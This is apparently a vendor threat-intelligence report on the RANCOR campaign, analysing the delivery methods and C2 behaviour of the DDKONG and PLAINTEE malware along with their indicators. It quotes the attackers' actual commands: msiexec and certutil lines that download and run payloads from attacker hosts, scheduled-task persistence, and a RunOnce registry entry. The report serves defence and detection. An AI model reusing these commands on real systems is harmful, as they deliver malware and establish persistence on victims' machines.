In February 2018, several KHRAT associated domains began resolving to the IP address\n89.46.222[.]97. We made this IP the center of our investigation.\n\n[Examining passive DNS (pDNS) records from PassiveTotal revealed several domain names associated with](https://www.paloaltonetworks.com/content/pan/en_US/products/application-framework/application-developer.html)\n[this IP that mimic popular technology companies.

The diagram in Figure 1\nshows the samples, domains, IP addresses and e-mail addresses that we identified during our investigation\n(See Appendix B for more detail on these.) There is a clear split between Cluster A and Cluster B, with no\ninfrastructure overlap between the two.\n\n_Figure 1 – Diagram showing the split of PLAINTEE samples across the two clusters of activity._\n\nOur Investigation into both clusters further showed that they were both involved in attacks targeting\norganizations in South East Asia. Based on the use of the relatively unique PLAINTEE malware, the malware’s\nuse of the same file paths on in each cluster, and the similar targeting, we have grouped these attacks\n\n\n-----\n\nFor many of the samples we’ve been unable to identify how they were delivered to end victims; however, in\nthree cases we were able to locate the files used to deliver the Trojan, which we found merited more\ninvestigation and are briefly discussed below.\n\n**Cluster A**\n\nCase 1: Delivery via document property macro –\na789a282e0d65a050cccae66c56632245af1c8a589ace2ca5ca79572289fd483\n\nIn our research we found at least one attack against a company leveraging a Microsoft Office Excel\ndocument with an embedded macro to launch the malware. Interestingly, the delivery document borrowed a\n[technique which was publicized in late 2017 as being used by the Sofacy threat actors, embedding the main](https://threatpost.com/updates-to-sofacy-turla-highlight-2017-q2-apt-activity/127297/)\nmalicious code in a EXIF metadata property of the document.\n\nBy doing so, the main content of the macro itself (Figure 2) can be kept relatively simple, and the malicious’\ncodes small footprint can help enable evasion of automated detection mechanisms based on macro content.\n\n_Figure 2 – The entire contents of the macro_\n\nThe ‘Company’ field in this case, contains the raw command that the attacker wishes to run, downloading\n\n\n-----\n\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n/tn \"Windows System\" /tr \"C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\"\n/mo 2 /F & schtasks /create /sc MINUTE /tn \"Windows System\" /tr\n\"C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\" /mo 2 /RU SYSTEM /c set\n/p=Set v=CreateObject(^\"Wscript.Shell^\"):v.Run ^\"msiexec /q /i\nhttp://199.247.6.253/ud^\",false,0 <nul >\nC:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs & schtasks /create /sc MINUTE\n/tn \"Windows System\" /tr \"C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\"\n/mo 2 /F & schtasks /create /sc MINUTE /tn \"Windows System\" /tr\n\"C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\" /mo 2 /RU SYSTEM\n\n\n**Cluster B**\nCase 2: Delivery via HTA Loader –\n1dc5966572e94afc2fbcf8e93e3382eef4e4d7b5bc02f24069c403a28fa6a458\n\nIn this case the attackers sent an HTML Application file (.hta) to targets most likely as an email attachment.\nWhen opened and then executed, the key components of the HTA file downloads and executes further\nmalware from a remote URLand loads a decoy image hosted externally (Figure 3).\n\n_Figure 3 – The decoy image loaded when the .HTA file is executed._\n\n\n-----\n\n**Case 3: Delivery via DLL Loader –**\n0bb20a9570a9b1e3a72203951268ffe83af6dcae7342a790fe195a2ef109d855\n\nWe identified three unique DLL loaders during this analysis. The loaders are extremely simple with a single\nexported function and are responsible for executing a single command. An exemplar command is given\nbelow:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\ncmd /c Echo CreateObject(\"WScript.Shell\").Run \"msiexec /q /i\nhttp:\\\\dlj40s.jdanief[.]xyz/images/word3.doc\",0\n>%userProfile%\\AppData\\Local\\Microsoft\\microsoft.vbs /c Echo\nCreateObject(\"WScript.Shell\").Run \"msiexec /q /i\nhttp:\\\\dlj40s.jdanief[.]xyz/images/word3.doc\",0\n>%userProfile%\\AppData\\Local\\Microsoft\\microsoft.vbs\nschtasks /create /sc MINUTE /tn \"Windows Scheduled MaintenBa\" /tr \"wscript\n%userProfile%\\AppData\\Local\\Microsoft\\microsoft.vbs\" /mo 10 /F /create /sc\nMINUTE /tn \"Windows Scheduled MaintenBa\" /tr \"wscript\n%userProfile%\\AppData\\Local\\Microsoft\\microsoft.vbs\" /mo 10 /F\n\ncmd /c certutil.exe -urlcache -split -f\nhttp:\\\\\\\\dlj40s.jdanief[.]xyz/images/1.pdf C:\\ProgramData\\1.pdf&start\nC:\\ProgramData\\1.pdf /c certutil.exe -urlcache -split -f\nhttp:\\\\\\\\dlj40s.jdanief[.]xyz/images/1.pdf C:\\ProgramData\\1.pdf&start\nC:\\ProgramData\\1.pdf\n\n\nIn the above command, the malware is downloading and executing a payload and configuring it for persistent\nexecution. In two of the three examples, the malware also downloads and opens a decoy PDF document\nhosted on a legitimate but compromised website. The decoy documents seen in these cases were related to\nCambodian news articles, an example is shown in Figure 4 below.\n\n\n-----\n\n_Figure 4 – 1.pdf decoy delivered by downloader_\n\nThe decoy above discusses a recent event that took place against political party supporters in Cambodia, a\nsimilar theme to the decoy document observed in Figure 3.\n\nIt is worth noting that the third DLL mentioned attempts to download the decoy document from a\ngovernment website. This same website was used previously in a KHRat campaign targeting Cambodian\ncitizens.\n\nAdditionally, two of the three DLL loaders were found to be hosted on this same compromised website,\nimplying that it was likely compromised again in early 2018. The filenames for these two DLL loaders are as\nfollows:\n\nActivity Schedule.pdf\n\n\n-----\n\nIn all cases where we were able to identify the final payloads used, the DDKONG or PLAINTEE malware\nfamilies were used. We observed DDKONG in use between February 2017 and the present, while PLAINTEE\nis a newer addition with the earliest known sample being observed in October 2017. It’s unclear if DDKONG\nis only used by one threat actor or more than one based on the data available.\n\nIn this section we’ll go over the capabilities and operation of these malware families.\n\n**DDKONG**\nFor the analysis below, we used the following file:\n\n**SHA256** 119572fafe502907e1d036cdf76f62b0308b2676ebdfc3a51dbab614d92bc7d0\n\n**SHA1** 25ba920cb440b4a1c127c8eb0fb23ee783c9e01a\n\n**MD5** 6fa5bcedaf124cdaccfa5548eed7f4b0\n\n**Compile Time** 2018-03-14 07:20:11 UTC\n\n**File Type** PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\n\n_Table 1 – DDKONG sample analyzed in full._\n\nThe malware in question is configured with the following three exported functions:\n\nServiceMain\nRundll32Call\nDllEntryPoint\n\nThe ServiceMain exported function indicates that this DLL is expected to be loaded as a service. If this\nfunction is successfully loaded, it will ultimately spawn a new instance of itself with the Rundll32Call export\nvia a call to rundll32.exe.\n\n|SHA256|119572fafe502907e1d036cdf76f62b0308b2676ebdfc3a51dbab614d92bc7d0|\n|---|---|\n|SHA1|25ba920cb440b4a1c127c8eb0fb23ee783c9e01a|\n|MD5|6fa5bcedaf124cdaccfa5548eed7f4b0|\n|Compile Time|2018-03-14 07:20:11 UTC|\n|File Type|PE32 executable (DLL) (GUI) Intel 80386, for MS Windows|\n\n\n-----\n\nDDKong attempts to decode an embedded configuration using a single byte XOR key of 0xC3. Once\ndecoded, the configuration contains the data shown in Figure 5 below.\n\n_Figure 5 – Decoded configuration with fields highlighted_\n\nAfter this configuration is decoded and parsed, DDKONG proceeds to send a beacon to the configured\nremote server via a raw TCP connection. The packet has a header of length 32 and an optional payload. In\nthe beacon, no payload is provided, and as such, the length of this packet is set to zero.\n\n\n-----\n\nAfter it sends the beacon, the malware expects a response command of either 0x4 or 0x6. Both responses\ninstruct the malware to download and load a remote plugin. In the event 0x4 is specified, the malware is\ninstructed to load the exported ‘InitAction’ function. If 0x6 is specified, the malware is instructed to load the\nexported ‘KernelDllCmdAction’ function. Prior to downloading the plugin, the malware downloads a buffer\nthat is concatenated with the embedded configuration and ultimately provided to the plugin at runtime. An\nexample of this buffer at runtime is below:\n\n00000000: 43 3A 5C 55 73 65 72 73 5C 4D 53 5C 44 65 73 6B C:\\Users\\MS\\Desk\n\n00000010: 74 6F 70 5C 52 53 2D 41 54 54 20 56 33 5C 50 6C top\\RS-ATT V3\\Pl\n\n00000020: 75 67 69 6E 42 69 6E 00 00 00 00 00 00 00 00 00 uginBin………\nuginBin………\n\n[TRUNCATED]\n\n00000100: 00 00 00 00 43 3A 5C 55 73 65 72 73 5C 4D 53 5C ….C:\\Users\\MS\\\n\n00000110: 44 65 73 6B 74 6F 70 5C 52 53 2D 41 54 54 20 56 Desktop\\RS-ATT V\n\n00000120: 33 5C 5A 43 6F 6E 66 69 67 00 00 00 00 00 00 00\n\n3\\ZConfig…….ZConfig…….\n\n[TRUNCATED]\n\n00000200: 00 00 00 00 00 00 00 00 00 40 00 00 F0 97 B5 01 ………@……\n\nAs we can see in the above text, two full file paths are included in this buffer, providing us with insight into\nthe original malware family’s name, as well as the author. After this buffer is collected, the malware\ndownloads the plugin and loads the appropriate function. During runtime, the following plugin was\nidentified:\n\n\n-----\n\n|MD5|a5164c686c405734b7362bc6b02488cb|\n|---|---|\n|Compile Time|2018-03-28 01:54:40 UTC|\n|File Type|PE32 executable (DLL) (GUI) Intel 80386, for MS Windows|\n\n\n_Table 2 – Plugin downloaded during runtime for DDKong sample.DDKong sample._\n\nThis plugin provides the attacker with the ability to both list files and download/upload files on the victim\nmachine.\n\n## PLAINTEE\n\nIn total we have been able to find six samples of PLAINTEE, which, based on our analysis, seems to be\nexclusively used by the RANCOR attackers. PLAINTEE is unusual in that it uses a custom UDP protocol for\nits network communications. For this walk through, we use the following sample:\n\n**SHA256** c35609822e6239934606a99cb3dbc925f4768f0b0654d6a2adc35eca473c505d\n\n**SHA1** 0bdb44255e9472d80ee0197d0bfad7d8eb4a18e9\n\n**MD5** d5679158937ce288837efe62bc1d9693\n\n**Compile Time** 2018-04-02 07:57:38 UTC\n\n**File Type** PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\n\n_Table 3 – PLAINTEE sample analyzed in full._\n\nThis sample is configured with three exported functions:\n\nAdd\nSub\nDllEntryPoint\n\nThe DLL expects the export named ‘Add’ to be used when initially loaded. When this function is executed\nPLAINTEE executes the following command in a new process to add persistence:\n\n|SHA256|c35609822e6239934606a99cb3dbc925f4768f0b0654d6a2adc35eca473c505d|\n|---|---|\n|SHA1|0bdb44255e9472d80ee0197d0bfad7d8eb4a18e9|\n|MD5|d5679158937ce288837efe62bc1d9693|\n|Compile Time|2018-04-02 07:57:38 UTC|\n|File Type|PE32 executable (DLL) (GUI) Intel 80386, for MS Windows|\n\n\n-----\n\n4\n5\n6\n\n\n\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\ CurrentVersion\\RunOnce\" /v\n\"Microsoft Audio\" /t REG_SZ /d \"%APPDATA%\\Network Service.exe\"\n\"[path_to_PLAINTEE]\",Add /f\n\n\nNext, the malware calls the ‘Sub’ function which begins by spawning a mutex named ‘microsoftfuckedupb’ to\nensure only a single instance is running at a given time. In addition, PLAINTEE will create a unique GUID via a\ncall to CoCreateGuid() to be used as an identifier for the victim. The malware then proceeds to collect\ngeneral system enumeration data about the infected machine and enters a loop where it will decode an\nembedded config blob and send an initial beacon to the C2 server.\n\nThe configuration blob is encoded using a simple single-byte XOR scheme. The first byte of the string is used\nas the XOR key to in turn decode the remainder of the data.\n\nDecoding this blob yields the following information, also found within the original binary:\n\n**Offset** **Description**\n\n0x4 C2 port (0x1f99 – 8089)\n\n0x8 C2 host (45.76.176[.]236)\n\n0x10C Flag used to identify the malware in network communications. (default\nflag:4/2/2018 1:01:33 AM)\n\n_Table 4 – Configuration stored in the malware._\n\nThe malware then proceeds to beacon to the configured port via a custom UDP protocol. The network\ntraffic is encoded in a similar fashion, with a random byte being selected as the first byte, which is then used\nto decode the remainder of the packet via XOR. An example of the decoded beacon is show in Figure 7.\n\n|Offset|Description|\n|---|---|\n|0x4|C2 port (0x1f99 – 8089)|\n|0x8|C2 host (45.76.176[.]236)|\n|0x10C|Flag used to identify the malware in network communications.

After the initial beacon, there is a two second delay in between all other requests made. This\nresponse is expected to have a return command of 0x66660002 and to contain the same GUID that was sent\nto the C2 server. Once this response is received, the malware spawns several new threads, with different\n\n|Offset|Description|\n|---|---|\n|0x0|Victim GUID (8C8CEED9-4326-448B-919E-249EEC0238A3)|\n|0x25|Victim IP Address (192.168.180.154)|\n|0x45|Command (0x66660001)|\n|0x49|Length of payload (0x2f – 47)|\n|0x4d|Field 1 – Windows major version (0x6 – Windows Vista+)|\n|0x51|Field 2 – Windows minor version (0x1 – Windows 7)|\n|0x55|Field 3 – Unknown (0x20)|\n|0x59|Payload (default flag:4/2/2018 1:01:33 AM)|\n\n\n-----\n\n|SHA256|b099c31515947f0e86eed0c26c76805b13ca2d47ecbdb61fd07917732e38ae78|\n|---|---|\n|SHA1|ac3f20ddc2567af0b050c672ecd59dddab1fe55e|\n|MD5|7c65565dcf5b40bd8358472d032bc8fb|\n|Compile Time|2017-09-25 00:54:18 UTC|\n|File Type|PE32 executable (DLL) (GUI) Intel 80386, for MS Windows|\n\n\n_Table 6 – PLAINTEE plugin observed in Wildfire_\n\nPLAINTEE expects the downloaded plugin to be a DLL with an export function of either ‘shell’ or ‘file’. The\nplugin uses the same network protocol as PLAINTEE and so we were able to trivially decode further\ncommands that were sent. The following commands were observed:\n\ntasklist\nipconfig /all\n\nThe attacker performed these two commands 33 seconds apart. As automated commands are typically\nperformed more quickly this indicates that they may have been sent manually by the attacker.\n\n## Conclusions\n\nThe RANCOR campaign represents a continued trend of targeted attacks against entities within the South\nEast Asia region. In a number of instances, politically motivated lures were used to entice victims into\nopening and subsequently loading previously undocumented malware families. These families made use of\ncustom network communication to load and execute various plugins hosted by the attackers. Notably the\nPLAINTEE malwares’ use of a custom UDP protocol is rare and worth considering when building heuristics\ndetections for unknown malware. Palo Alto Networks will continue to monitor these actors, their malware,\nand their infrastructure going forward.\n\nPalo Alto Networks customers are protected against the threats discussed in this blog in the following ways:\n\n\n-----\n\nAdditional mitigations that could help to prevent attacks like these from succeeding in your environment\ninclude:\n\nChanging the default handler for “.hta” files in your environment so that they cannot be directly\nexecuted.hta” files in your environment so that they cannot be directly executed.\n\n## Appendix A – PLAINTEE older variant\nOlder variants of PLAINTEE can be identified via the unique mutex created during runtime.
